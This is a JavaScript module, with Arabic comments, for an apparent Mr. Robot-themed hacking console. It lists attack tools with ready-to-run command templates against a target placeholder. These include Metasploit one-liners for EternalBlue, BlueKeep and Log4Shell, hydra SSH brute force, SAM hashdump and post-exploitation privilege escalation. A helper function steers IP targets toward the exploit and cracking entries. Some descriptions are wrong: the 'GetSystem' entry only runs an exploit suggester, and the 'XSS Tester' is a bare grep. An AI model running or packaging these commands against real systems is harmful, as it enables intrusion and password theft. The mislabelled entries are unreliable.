// ==================== قاعدة بيانات أدوات إليوت الكاملة ====================

export const TOOLS = [
  // ──────────────────────────────────── الفحص (Scanner) ────────────────────────────────────
  {
    id: 'nmap',
    name: 'Nmap',
    cat: 'scanner',
    desc: 'ماسح المنافذ والشبكات - أداة إليوت الأولى لرسم خريطة الهدف',
    cmd: 'nmap -sV -Pn -T4 {TARGET}',
    risk: 'medium',
    icon: '🔍'
  },
  {
    id: 'masscan',
    name: 'Masscan',
    cat: 'scanner',
    desc: 'أسرع ماسح منافذ في العالم - يفحص الإنترنت كله في 6 دقائق',
    cmd: 'masscan -p1-65535 --rate=1000 {TARGET}',
    risk: 'high',
    icon: '⚡'
  },
  {
    id: 'arp_sweep',
    name: 'ARP Sweep',
    cat: 'scanner',
    desc: 'اكتشاف الأجهزة على الشبكة المحلية - أداة إليوت الصامتة',
    cmd: 'arp-scan --localnet',
    risk: 'medium',
    icon: '📡'
  },
  {
    id: 'smb_scanner',
    name: 'SMB Scanner',
    cat: 'scanner',
    desc: 'كشف إصدار SMB - للبحث عن أهداف EternalBlue',
    cmd: 'nmap --script smb-os-discovery -p 445 {TARGET}',
    risk: 'high',
    icon: '📂'
  },

  // ──────────────────────────────────── الاستغلال (Exploit) ────────────────────────────────────
  {
    id: 'eternal_blue',
    name: 'EternalBlue',
    cat: 'exploit',
    desc: 'ثغرة SMBv1 الشهيرة - استخدمها WannaCry و NotPetya',
    cmd: 'msfconsole -q -x "use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS {TARGET}; run; exit"',
    risk: 'critical',
    icon: '💀'
  },
  {
    id: 'bluekeep',
    name: 'BlueKeep',
    cat: 'exploit',
    desc: 'ثغرة RDP القاتلة - تسمح بالدخول بدون كلمة مرور',
    cmd: 'msfconsole -q -x "use exploit/windows/rdp/cve_2019_0708_bluekeep_rce; set RHOSTS {TARGET}; run; exit"',
    risk: 'critical',
    icon: '🔓'
  },
  {
    id: 'log4shell',
    name: 'Log4Shell',
    cat: 'exploit',
    desc: 'ثغرة Log4j - أثرت على ملايين الخوادم عالمياً',
    cmd: 'msfconsole -q -x "use exploit/multi/http/log4shell_header_injection; set RHOSTS {TARGET}; run; exit"',
    risk: 'critical',
    icon: '☕'
  },
  {
    id: 'sqli_tester',
    name: 'SQLi Tester',
    cat: 'exploit',
    desc: 'فاحص SQL Injection - حمولات جاهزة للاختبار',
    cmd: 'sqlmap -u {TARGET} --batch --level=3',
    risk: 'high',
    icon: '💉'
  },
  {
    id: 'xss_tester',
    name: 'XSS Tester',
    cat: 'exploit',
    desc: 'فاحص XSS - يختبر GET و POST و Headers',
    cmd: 'curl -s {TARGET} | grep -i "script"',
    risk: 'high',
    icon: '⚠️'
  },

  // ──────────────────────────────────── OSINT ────────────────────────────────────
  {
    id: 'theharvester',
    name: 'theHarvester',
    cat: 'osint',
    desc: 'جمع الإيميلات والنطاقات الفرعية - أداة إليوت للاستطلاع',
    cmd: 'theHarvester -d {TARGET} -b google,linkedin',
    risk: 'low',
    icon: '🌐'
  },
  {
    id: 'whois',
    name: 'WHOIS',
    cat: 'osint',
    desc: 'معلومات تسجيل النطاق - تاريخ الإنشاء، المالك',
    cmd: 'whois {TARGET}',
    risk: 'low',
    icon: '📋'
  },
  {
    id: 'sherlock',
    name: 'Sherlock',
    cat: 'osint',
    desc: 'صائد الأسماء - البحث عن اسم مستخدم عبر 300+ منصة',
    cmd: 'sherlock {TARGET}',
    risk: 'low',
    icon: '🕵️'
  },

  // ──────────────────────────────────── كسر كلمات المرور (Crack) ────────────────────────────────────
  {
    id: 'hydra',
    name: 'Hydra',
    cat: 'crack',
    desc: 'أداة تخمين كلمات المرور - تدعم 50+ بروتوكول',
    cmd: 'hydra -l admin -P /usr/share/wordlists/rockyou.txt {TARGET} ssh',
    risk: 'high',
    icon: '🔑'
  },
  {
    id: 'john',
    name: 'John the Ripper',
    cat: 'crack',
    desc: 'كاسر كلمات المرور من التجزئات - يدعم 100+ صيغة',
    cmd: 'john --wordlist=/usr/share/wordlists/rockyou.txt {TARGET}',
    risk: 'high',
    icon: '🔨'
  },

  // ──────────────────────────────────── ما بعد الاختراق (Post) ────────────────────────────────────
  {
    id: 'hashdump',
    name: 'Hashdump',
    cat: 'post',
    desc: 'استخراج تجزئات كلمات المرور من SAM',
    cmd: 'msfconsole -q -x "use post/windows/gather/hashdump; set SESSION 1; run; exit"',
    risk: 'critical',
    icon: '🗄️'
  },
  {
    id: 'getsystem',
    name: 'GetSystem',
    cat: 'post',
    desc: 'رفع الصلاحيات إلى SYSTEM - أعلى صلاحية في ويندوز',
    cmd: 'msfconsole -q -x "use post/multi/recon/local_exploit_suggester; set SESSION 1; run; exit"',
    risk: 'critical',
    icon: '⬆️'
  },

  // ──────────────────────────────────── الدفاع (Defense) ────────────────────────────────────
  {
    id: 'security_headers',
    name: 'Security Headers',
    cat: 'defense',
    desc: 'فحص رؤوس الأمان HTTP - HSTS, CSP, X-Frame',
    cmd: 'curl -sI {TARGET} | grep -iE "strict-transport|content-security|x-frame|x-content"',
    risk: 'low',
    icon: '🛡️'
  },
  {
    id: 'ssl_scanner',
    name: 'SSL Scanner',
    cat: 'defense',
    desc: 'فحص قوة تشفير SSL/TLS - كشف الثغرات',
    cmd: 'nmap --script ssl-enum-ciphers -p 443 {TARGET}',
    risk: 'medium',
    icon: '🔒'
  },
];

// ==================== الفئات ====================
export const CATEGORIES = {
  scanner: { label: 'الفحص', icon: '🔍', color: '#00ff88' },
  exploit: { label: 'الاستغلال', icon: '⚔️', color: '#ff3b3b' },
  osint: { label: 'OSINT', icon: '🌐', color: '#00aaff' },
  crack: { label: 'كسر كلمات المرور', icon: '🔓', color: '#ffaa00' },
  post: { label: 'ما بعد الاختراق', icon: '📌', color: '#aa00ff' },
  defense: { label: 'الدفاع', icon: '🛡️', color: '#00ccaa' },
};

// ==================== دوال المساعدة ====================
export function getToolsByCategory(cat) {
  if (!cat || cat === 'all') return TOOLS;
  return TOOLS.filter(t => t.cat === cat);
}

export function getToolById(id) {
  return TOOLS.find(t => t.id === id);
}

export function getSuggestedTools(target) {
  if (!target) return [];
  const t = target.toLowerCase();
  if (t.includes('@')) return TOOLS.filter(tool => tool.cat === 'osint');
  if (/^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$/.test(t.trim())) return TOOLS.filter(tool => ['scanner', 'exploit', 'crack'].includes(tool.cat));
  if (/^[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/.test(t.trim())) return TOOLS.filter(tool => ['scanner', 'osint', 'defense'].includes(tool.cat));
  return TOOLS.slice(0, 8);
}
